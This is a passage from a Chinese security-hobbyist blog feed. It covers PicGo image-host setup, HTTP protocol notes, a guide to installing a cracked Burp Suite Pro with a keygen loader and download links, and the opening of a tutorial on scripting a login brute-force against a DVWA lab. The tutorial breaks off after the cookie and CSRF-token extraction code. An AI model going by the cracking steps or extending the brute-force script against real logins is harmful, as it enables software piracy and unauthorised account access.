<p>创建成功之后然后点击settings</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208220402727.png" alt="image-20210208220402727"><br>点击Personal access tokens<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208220536381.png" alt="image-20210208220536381"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208220626435.png" alt="image-20210208220626435"></p>
<p>然后输入密码</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208220821614.png" alt="image-20210208220821614"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208220952661.png" alt="image-20210208220952661"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208221026857.png" alt="image-20210208221026857"></p>
<p>叫令牌复制下来</p>
<h1 id="PicGo的下载"><a href="#PicGo的下载" class="headerlink" title="PicGo的下载"></a>PicGo的下载</h1><div class="note danger simple"><p><strong>PicGo他跨平台windows，linux，mac都支持</strong></p>
</div>

<p>我用的是kali linux下载的是linux版的<br>下载地址<a href="https://github.com/Molunerfinn/PicGo">PicGo下载</a></p>
<div class="note info simple"><p><strong>linux下载的是这个</strong></p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209084041052.png"></p>
<div class="note info simple"><p>添加运行权限</p>
</div>

<p>我用的是linux的root用户所以运行要添加<code>--no-sandbox</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x PicGo-2.3.0-beta.4.AppImage</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;PicGo-2.3.0-beta.3.AppImage </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209084527331.png" alt="image-20210209084527331"></p>
<h1 id="PicGo加GitHub配置jsd"><a href="#PicGo加GitHub配置jsd" class="headerlink" title="PicGo加GitHub配置jsd"></a>PicGo加GitHub配置jsd</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209085226343.png" alt="image-20210209085226343"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209085740293.png" alt="image-20210209085740293"></p>
<ol>
<li>第一个<strong>repo</strong>是你创建的库的目录</li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209085953768.png" alt="image-20210209085953768"></p>
<ol start="2">
<li><p>第二个<strong>branch</strong>是分支<br>是<code>master</code></p>
</li>
<li><p>第三个<strong>token</strong>是上面</p>
<p>就是我们复制的那个</p>
</li>
<li><p>是路径这个我没有添加</p>
</li>
<li><p>第五个这里使用了jsd加速</p>
<p><code>https://cdn.jsdelivr.net/gh/用户名/仓库名</code></p>
<p>我们就可以上传图片了</p>
</li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/20210209090511.png"></p>
<h1 id="typora添加PicGo"><a href="#typora添加PicGo" class="headerlink" title="typora添加PicGo"></a>typora添加PicGo</h1><div class="note info simple"><p>也可以看看我这个文章<a href="https://www.zssnp.top/2020/12/23/kalilinux%E4%BD%BF%E7%94%A8Typora%E5%8A%A0PicGo/">kalilinux使用Typora加PicGo</a>我是用的gitee，github配置和gitee差不多</p>
</div>

<h2 id="下载PicGo-Core"><a href="#下载PicGo-Core" class="headerlink" title="下载PicGo-Core"></a>下载PicGo-Core</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20201223202830865.png" alt="image-20201223202830865"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223202957453.png" alt="image-20201223202957453"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="http://121.199.69.44/zp/img/image-20201223203033934.png" alt="image-20201223203033934"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="http://121.199.69.44/zp/img/image-20201223203053866.png" alt="image-20201223203053866"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20201223203136274.png" alt="image-20201223203136274"></p>
<h2 id="配置文件内容"><a href="#配置文件内容" class="headerlink" title="配置文件内容"></a>配置文件内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;picBed&quot;: &#123;</span><br><span class="line">    &quot;current&quot;: &quot;github&quot;,</span><br><span class="line">    &quot;github&quot;: &#123;</span><br><span class="line">      &quot;repo&quot;: &quot;wzass&#x2F;zp&quot;, &#x2F;&#x2F; 仓库名，格式是 username&#x2F;reponame</span><br><span class="line">      &quot;branch&quot;: &quot;main&quot;, &#x2F;&#x2F; 仓库分支</span><br><span class="line">      &quot;token&quot;: &quot;&quot;, &#x2F;&#x2F; github token</span><br><span class="line">      &quot;path&quot;: &quot;&quot;, &#x2F;&#x2F; 自定义存储路径，比如 img&#x2F;</span><br><span class="line">      &quot;customUrl&quot;: &quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;wzass&#x2F;zp&quot; &#x2F;&#x2F; 自定义域名，注意要加 http:&#x2F;&#x2F;或者 https:&#x2F;&#x2F;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;uploader&quot;: &quot;github&quot;, &#x2F;&#x2F;启用github</span><br><span class="line">    &quot;transformer&quot;: &quot;path&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;picgoPlugins&quot;: &#123;</span><br><span class="line">    &quot;picgo-plugin-gitee-uploader&quot;: true,</span><br><span class="line">    &quot;picgo-plugin-smms-user&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看一下我的配置</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209095239678.png" alt="image-20210209095239678"></p>
<h2 id="测试配置是否成功"><a href="#测试配置是否成功" class="headerlink" title="测试配置是否成功"></a>测试配置是否成功</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209095411084.png" alt="image-20210209095411084"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209095128016.png" alt="image-20210209095128016"></p>
<p>成功</p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>http协议</title>
    <url>/2020/01/20/http%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="http协议和https协议的区别"><a href="#http协议和https协议的区别" class="headerlink" title="http协议和https协议的区别"></a>http协议和https协议的区别</h2><ul>
<li>https<ul>
<li>https是加密传输的黑客可以进行嗅探不到明文(黑客也可以用伪造密钥进行嗅探) </li>
</ul>
</li>
<li>http<ul>
<li>他是明文传输的可以轻松的嗅探的密码</li>
</ul>
</li>
</ul>
<h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><p>http请求有：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成</p>
<p>常见的http报文<br><img src= "/img/loading2.gif" data-lazy-src="https://www.runoob.com/wp-content/uploads/2013/11/2012072810301161.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201206182518.png"></p>
<h3 id="常见的请求报文"><a href="#常见的请求报文" class="headerlink" title="常见的请求报文"></a>常见的请求报文</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:4000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: crisp-client%2Fsession%2F7ab2cb18-d418-443e-93a6-75ae83ae2793&#x3D;session_21a654dd-beba-476b-9c62-68434e4cfdc9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p>
<p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。</p>
<p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p>
<h3 id="HTTP请求头信息"><a href="#HTTP请求头信息" class="headerlink" title="HTTP请求头信息"></a>HTTP请求头信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1  GET      请求指定的页面信息，并返回实体主体。 </span><br><span class="line">2  HEAD     类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 </span><br><span class="line">3  POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。 </span><br><span class="line">4  PUT      从客户端向服务器传送的数据取代指定的文档的内容 </span><br><span class="line">5  DELETE           请求服务器删除指定的页面。 </span><br><span class="line">6  CONNECT          HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。 </span><br><span class="line">7  OPTIONS          允许客户端查看服务器的性能。 </span><br><span class="line">8  TRACE            回显服务器收到的请求，主要用于测试或诊断。 </span><br><span class="line">9  PATCH            是对 PUT 方法的补充，用来对已知资源进行局部更新 。 </span><br></pre></td></tr></table></figure>
<h3 id="实图GET请求"><a href="#实图GET请求" class="headerlink" title="实图GET请求"></a>实图GET请求</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200914174747.png"></p>
<h3 id="实图POST请求"><a href="#实图POST请求" class="headerlink" title="实图POST请求"></a>实图POST请求</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200914184139.png"></p>
<h2 id="http响应"><a href="#http响应" class="headerlink" title="http响应"></a>http响应</h2><p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。<br><img src= "/img/loading2.gif" data-lazy-src="https://www.runoob.com/wp-content/uploads/2013/11/httpmessage.jpg"></p>
<h3 id="常见的响应报文"><a href="#常见的响应报文" class="headerlink" title="常见的响应报文"></a>常见的响应报文</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept：text&#x2F;html,application&#x2F;xhtml+xm…plication&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding：gzip, deflate</span><br><span class="line">Accept-Language：zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection：keep-alive</span><br><span class="line">Host：192.168.31.94</span><br><span class="line">Upgrade-Insecure-Requests：1</span><br><span class="line">User-Agent：Mozilla&#x2F;5.0 (X11; Linux x86_64…) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="HTTP响应头信息"><a href="#HTTP响应头信息" class="headerlink" title="HTTP响应头信息"></a>HTTP响应头信息</h3><p>Allow<br>服务器支持哪些请求方法（如GET、POST等）。</p>
<p>Content-Encoding<br>文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</p>
<p>Content-Length<br>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</p>
<p>Content-Type<br>表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</p>
<p>Date<br>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</p>
<p>Expires<br>应该在什么时候认为文档已经过期，从而不再缓存它？</p>
<p>Last-Modified<br>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</p>
<p>Location<br>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</p>
<p>Refresh<br>表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL=<a href="http://host/path&quot;)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://host/path&quot;)让浏览器读取指定的页面。</a><br>注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV=”Refresh” CONTENT=”5;URL=<a href="http://host/path&quot;%EF%BC%9E%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E6%88%96%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8CGI%E6%88%96Servlet%E7%9A%84HTML%E7%BC%96%E5%86%99%E8%80%85%E5%8D%81%E5%88%86%E9%87%8D%E8%A6%81%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%AF%B9%E4%BA%8EServlet%E6%9D%A5%E8%AF%B4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AERefresh%E5%A4%B4%E6%9B%B4%E5%8A%A0%E6%96%B9%E4%BE%BF%E3%80%82">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a></p>
<p>注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV=”Refresh” …＞。</p>
<p>注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</p>
<p>Server<br>服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</p>
<p>Set-Cookie<br>设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</p>
<p>WWW-Authenticate<br>客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=＼”executives＼””)。<br>注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</p>
<h3 id="实图GET响应"><a href="#实图GET响应" class="headerlink" title="实图GET响应"></a>实图GET响应</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200914191120.png"></p>
<h3 id="实图POST响应"><a href="#实图POST响应" class="headerlink" title="实图POST响应"></a>实图POST响应</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200914191007.png"></p>
]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>kali2020教程Burpsuite破解汉化版安装</title>
    <url>/2020/01/20/kali2020%E6%95%99%E7%A8%8BBurpsuite%E7%A0%B4%E8%A7%A3%E6%B1%89%E5%8C%96%E7%89%88%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>BurpSuite<br>废话不多说正题</p>
<ol>
<li>下载<br>下面是我提供的下载版本和工具</li>
</ol>
<p>[Burp Suite2.0.1.1版]<a href="https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A">https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A</a>提取码：t3hp<br>破解文件下载地址（<a href="https://wwa.lanzous.com/isWu2gs6n6j%EF%BC%89">https://wwa.lanzous.com/isWu2gs6n6j）</a><br>[汉化包]<a href="https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ">https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ</a>提取码：b8u0<br>[java ]<a href="https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw">https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw</a>提取码：6346</p>
<ol start="2">
<li>进行配置<br>叫下载好的保存到一个目录里<br>然后解压出来叫下载好的jdk-8u161-linux-x64.tar.gz<br>命令</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">tar -xzvf jdk<span class="number">-8u</span>161-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104131200946.PNG" alt="在这里插入图片描述"><br>解压好进行配置运行下面的代码<br>1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JAVA_HOME=/root/桌面/jdk1<span class="number">.8</span>/</span><br></pre></td></tr></table></figure>
<p>2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:&#123;JAVA_HOME&#125;/lib:JREHOME/libexportPATH=&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>3</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /root/桌面/jdk1<span class="number">.8</span>/bin/java <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>4</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/javac javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>5</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure>
<p>6</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure>
<p>7</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac</span><br></pre></td></tr></table></figure>
<p>然后运行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p>查看配置成功<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104132555181.png" alt="在这里插入图片描述"><br>3. 开始破解<br>1.先创建一个a.sh文件<br>文件里面a.sh内容</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -jar burp-loader-keygen.ja</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104140446983.png" alt="在这里插入图片描述"><br>加执行权限</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chmod +x a.sh</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104140551606.png" alt="在这里插入图片描述"><br>然后运行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./a,sh</span><br></pre></td></tr></table></figure>
<p>运行后会出现<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104140607834.png" alt="在这里插入图片描述"><br>2.创建一个burp.sh文件<br>文件里面a.sh内容</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=utf<span class="number">-8</span> -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar  burpsuite_pro_v2<span class="number">.0</span><span class="number">.11b</span>eta.jar</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104140820842.png" alt="在这里插入图片描述"><br>加执行权限</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chmod +x burp.sh</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./burp.sh</span><br></pre></td></tr></table></figure>
<p>可以看到是中文的了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141137443.png" alt="在这里插入图片描述"><br>3. 安装<br>下面叫内容复制到里面<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141229717.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141306592.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019110414131589.png" alt="在这里插入图片描述"><br>成功<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141336122.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141342661.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>脚本编写实现简单登录爆破</title>
    <url>/2021/08/18/jiaoben/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note warning simple"><p>现在很的在编写脚本的时候没有灵感，但是我是不一样的，我对代码创造方面想象力丰富，这是我最大的特点，下面我闲着没事就随便写了一个，非常简单的一个脚本</p>
</div>



<h1 id="实验环境DVWA登录页面"><a href="#实验环境DVWA登录页面" class="headerlink" title="实验环境DVWA登录页面"></a>实验环境DVWA登录页面</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817105607225.png" alt="image-20210817105607225"></p>
<h1 id="手动测试他的登录机制"><a href="#手动测试他的登录机制" class="headerlink" title="手动测试他的登录机制"></a>手动测试他的登录机制</h1><p>可以用burp进行抓包查看他的请求和响应</p>
<div class="note info simple"><p>下面这个是他的首次请求的内容，请求数据包</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817110050593.png" alt="image-20210817110050593"></p>
<div class="note info simple"><p>第二次请求的时候发现他都有Cookie了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817110332978.png" alt="image-20210817110332978"></p>
<div class="note info simple"><p>发现这个Cookie是第一次请求的时候他返回给客户端的，说明是服务器给的Cookie，基本上都是服务器给的</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817110545865.png" alt="image-20210817110545865"></p>
<div class="note info simple"><p>手动登录查看一下请求，发现有一个给登录着的随机数，如果随机数不正确的话，肯定是登录不了的</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817110909356.png" alt="image-20210817110909356"></p>
<div class="note info simple"><p>找随机数的来源，发现他是上一次请求响应的时候服务器给的</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817111225514.png" alt="image-20210817111225514"></p>
<h1 id="脚步的编写"><a href="#脚步的编写" class="headerlink" title="脚步的编写"></a>脚步的编写</h1><h2 id="获取登录的Cookie"><a href="#获取登录的Cookie" class="headerlink" title="获取登录的Cookie"></a>获取登录的Cookie</h2><p>用python的会话维持，获得Cookie，不要会话维持就像两个浏览器访问一样到下次Cookie是不一样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用`Session` 对象维持会话</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="comment"># 用Session的get请求</span></span><br><span class="line">ask=r.get(<span class="string">&#x27;http://192.168.84.58/login.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies方法输出获取请求后的cookies信息  用items()方法将其转化为元组组成的列表</span></span><br><span class="line">getcookies = ask.cookies.items()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出cookies</span></span><br><span class="line">print(getcookies)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[(&#39;PHPSESSID&#39;, &#39;b8lt4lvnr71cdosi1280vdceu4&#39;), (&#39;security&#39;, &#39;low&#39;)]</span><br></pre></td></tr></table></figure>
<p>我们可以用指定输出列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用`Session` 对象维持会话</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="comment"># 用Session的get请求</span></span><br><span class="line">ask=r.get(<span class="string">&#x27;http://192.168.84.58/login.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  用items()方法将其转化为元组组成的列表</span></span><br><span class="line">getcookies = ask.cookies.items()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出cookies</span></span><br><span class="line">print(getcookies[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">print(getcookies[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">print(getcookies[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">print(getcookies[<span class="number">1</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>结果，可以看见cookies获取到了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPSESSID</span><br><span class="line">omhihkt4k2iae7ujgbl1q0dht6</span><br><span class="line">security</span><br><span class="line">low</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817113306875.png" alt="image-20210817113306875"></p>
<h2 id="获得随机数"><a href="#获得随机数" class="headerlink" title="获得随机数"></a>获得随机数</h2><p>应为随机数是在请求的响应的数据比分里面只能用正则表达式来获取</p>
<p>正则表达式写错<code>\w&#123;32&#125;</code>就可以匹配到了，<strong>他的意思是字母数字及下划线有连续的32个</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817120046312.png" alt="image-20210817120046312"></p>
<p>代码这样写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用`Session` 对象维持会话</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="comment"># 用Session的get请求</span></span><br><span class="line">ask=r.get(<span class="string">&#x27;http://192.168.84.58/login.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># findall()他会获得表达式里面的全部内容</span></span><br><span class="line"><span class="comment"># ask.text获得响应的数据的内容</span></span><br><span class="line">x =re.findall(<span class="string">&#x27;\w&#123;32&#125;&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(x[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">44c9b688a6d79d94727744f97e2108c0</span><br></pre></td></tr></table></figure>





<h2 id="POST请求模拟登录"><a href="#POST请求模拟登录" class="headerlink" title="POST请求模拟登录"></a>POST请求模拟登录</h2><p>上面的cookies和随机数都已经得到了就可以破解了</p>
<p>我们就可以编写一个<code>post</code>请求</p>
<p>查看他的请求内容</p>
